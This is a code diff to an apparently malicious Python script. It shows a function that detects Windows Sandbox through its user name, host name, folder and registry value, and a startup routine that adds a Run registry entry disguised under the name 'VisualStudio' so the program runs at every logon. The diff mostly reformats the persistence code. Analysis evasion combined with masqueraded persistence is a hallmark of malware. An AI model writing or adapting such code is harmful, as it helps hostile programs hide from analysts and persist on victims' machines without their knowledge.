@@ -83,15 +83,12 @@ def is_windows_sandbox():
     if getpass.getuser() == "WDAGUtilityAccount":
         print("Windows Sandbox detected: WDAGUtilityAccount user.")
         return True
-
     if socket.gethostname().upper().startswith("WDAG"):
         print("Windows Sandbox detected: WDAG computer name.")
         return True
-
     if os.path.exists(r"C:\Users\WDAGUtilityAccount"):
         print("Windows Sandbox detected: WDAGUtilityAccount directory.")
         return True
-
     try:
         reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\AppModel\StateChange")
         sandbox_value, _ = winreg.QueryValueEx(reg_key, "PackageFullName")
@@ -101,14 +98,25 @@ def is_windows_sandbox():
             return True
     except FileNotFoundError:
         pass
-
     return False
 
 def add_to_startup():
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "VisualStudio", 0, winreg.REG_SZ, sys.executable + ' "' + os.path.abspath(__file__) + '"')
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(
+            key,
+            "VisualStudio",
+            0,
+            winreg.REG_SZ,
+            sys.executable
+        )
         winreg.CloseKey(key)
+        print("Added to startup successfully.")
     except Exception as e:
         print(f"Error adding to startup: {e}")
 
